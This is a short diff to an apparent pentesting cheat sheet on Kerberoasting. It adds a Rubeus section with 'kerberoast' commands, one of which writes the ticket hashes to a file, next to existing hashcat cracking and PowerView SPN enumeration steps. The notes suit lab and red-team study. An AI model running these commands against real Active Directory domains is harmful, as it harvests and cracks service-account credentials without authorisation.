@@ -79,6 +79,20 @@ or
 hashcat -m 13100 [hashes] /usr/share/wordlists/rockyou.txt
 ```
 
+---
+
+### **Windows — Rubeus**
+
+```
+# Enumerate/request Kerberoastable tickets
+Rubeus.exe kerberoast
+
+# Save output to a file
+Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+---
+
 If no results = password is not in the wordlist
 #### 1. 🖥️ Enumerate SPNs (Windows - PowerView)
 ```
